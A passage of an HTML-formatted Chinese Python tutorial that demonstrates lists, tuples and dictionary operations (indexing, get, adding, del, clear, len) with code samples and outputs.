punctuation\">,</span><span class=\"token string\">'B'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'C'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'D'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'E'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'F'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'G'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'H'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">for</span> name <span class=\"token keyword\">in</span> names<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    index <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    offices<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">for</span> tempNames <span class=\"token keyword\">in</span> offices<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'办公室%d的人数为:%d'</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>tempNames<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    i<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">for</span> name <span class=\"token keyword\">in</span> tempNames<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\"</span><span class=\"token operator\">%</span>name<span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token operator\">*</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"元组\"><a class=\"markdownIt-Anchor\" href=\"#元组\">#</a> <span class=\"label success\">元组</span></h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Python的元组与列表类似，不同之处在于元组的元素不能修改。元组使用小括号，列表使用方括号</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> aTuple <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'et'</span><span class=\"token punctuation\">,</span><span class=\"token number\">77</span><span class=\"token punctuation\">,</span><span class=\"token number\">99.9</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> aTuple</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token string\">'et'</span><span class=\"token punctuation\">,</span><span class=\"token number\">77</span><span class=\"token punctuation\">,</span><span class=\"token number\">99.9</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token operator\">></span>访问元组</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>s<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token operator\">></span>修改元组</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>说明： python中不允许修改元组的数据，包括不能删除其中的元素。</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> <span class=\"token operator\">&lt;</span><span class=\"token number\">3</span><span class=\"token operator\">></span>count<span class=\"token punctuation\">,</span> index</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    index和count与字符串和列表中的用法相同</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'b'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'c'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 注意是左闭右开区间</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  File <span class=\"token string\">\"&lt;stdin>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ValueError<span class=\"token punctuation\">:</span> <span class=\"token builtin\">tuple</span><span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> x <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> <span class=\"token builtin\">tuple</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a<span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">(</span><span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a<span class=\"token punctuation\">.</span>count<span class=\"token punctuation\">(</span><span class=\"token string\">'d'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"字典\"><a class=\"markdownIt-Anchor\" href=\"#字典\">#</a> <span class=\"label success\">字典</span></h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>有没有方法，既能存储多个数据，还能在访问元素的很方便就能够定位到需要的那个元素呢？</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>另一个场景：</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>学生信息列表，每个学生信息包括学号、姓名、年龄等，如何从中找到某个学生的信息？</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> studens <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token number\">1001</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"王bao强\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">24</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1002</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"马rong\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1005</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"宋x\"</span>，<span class=\"token number\">24</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>循环遍历？ No！</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token operator\">></span>软件开发中的字典</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>info <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'班长'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'address'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'地球亚洲中国北京'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 说明：</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 字典和列表一样，也能够存储多个数据</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 列表中找某个元素时，是根据下标进行的</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#  字典中找某个元素时，是根据 ' 名字 '（就是冒号：前面的那个值，例如上面代码中的 'name'、'id'、'sex'）</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 字典的每个元素由 2 部分组成，键：值。例如 'name':' 班长 ' ,'name' 为键，' 班长 ' 为值</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">3</span><span class=\"token operator\">></span>根据键访问值</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>zxc <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'班长'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'address'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'地球亚洲中国北京'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxc<span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxc<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxc<span class=\"token punctuation\">[</span><span class=\"token string\">'sex'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxc<span class=\"token punctuation\">[</span><span class=\"token string\">'address'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>在我们不确定字典中是否存在某个键而又想获取其值时，可以使用get方法，还可以设置默认值：</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>zxc <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'班长'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'address'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'地球亚洲中国北京'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxc<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'234'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxc<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'234'</span><span class=\"token punctuation\">,</span><span class=\"token number\">989</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token number\">989</span></pre></td></tr></table></figure><h4 id=\"字典的常见操作\"><a class=\"markdownIt-Anchor\" href=\"#字典的常见操作\">#</a> <span class=\"label success\">字典的常见操作</span></h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token operator\">></span>修改元素</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>字典的每个元素中的数据是可以修改的，只要通过key找到，即可修改</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>zxc <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'班长'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'address'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'地球亚洲中国北京'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入id\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>zxc<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>请输入id9999</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'班长'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'9999'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'address'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'地球亚洲中国北京'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">2</span><span class=\"token operator\">></span>添加元素</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>如果在使用 变量名<span class=\"token punctuation\">[</span><span class=\"token string\">'键'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> 数据 时，这个“键”在字典中，不存在，那么就会新增这个元素。</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>zxc <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'班长'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'address'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'地球亚洲中国北京'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入sfz:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>zxc<span class=\"token punctuation\">[</span><span class=\"token string\">'sfz'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>c</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>请输入sfz<span class=\"token punctuation\">:</span><span class=\"token number\">9120348</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'班长'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'address'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'地球亚洲中国北京'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sfz'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'9120348'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">3</span><span class=\"token operator\">></span>删除元素</pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>对字典进行删除操作，有一下几种：</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">del</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    clear<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>demo<span class=\"token punctuation\">:</span> <span class=\"token keyword\">del</span>删除指定的元素</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>zxc <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'班长'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'address'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'地球亚洲中国北京'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">del</span> zxc<span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'address'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'地球亚洲中国北京'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>demo<span class=\"token punctuation\">:</span> <span class=\"token keyword\">del</span>删除整个字典</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>info <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'monitor'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'address'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'China'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'删除前,%s'</span> <span class=\"token operator\">%</span> info<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">del</span> info</pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'删除后,%s'</span> <span class=\"token operator\">%</span> info<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  File <span class=\"token string\">\"D:/python基础/基础/dome.py\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'删除后,%s'</span> <span class=\"token operator\">%</span> zxc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>NameError<span class=\"token punctuation\">:</span> name <span class=\"token string\">'zxc'</span> <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> defined</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>删除前<span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'monitor'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'address'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'China'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>clear清空整个字典</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>info <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'monitor'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'address'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'China'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'清空前,%s'</span> <span class=\"token operator\">%</span> info<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>info<span class=\"token punctuation\">.</span>clear<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'清空后,%s'</span> <span class=\"token operator\">%</span> info<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>删除前<span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'monitor'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'f'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'address'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'China'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>删除后<span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>字典的常见操作<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">1</span><span class=\"token operator\">></span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>测量字典中，键值对的个数</pre></td></tr><tr><td data-num=\"68\"></td><td><pre>dict01 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'张三'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'age'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sex'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'m'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">print</span><span 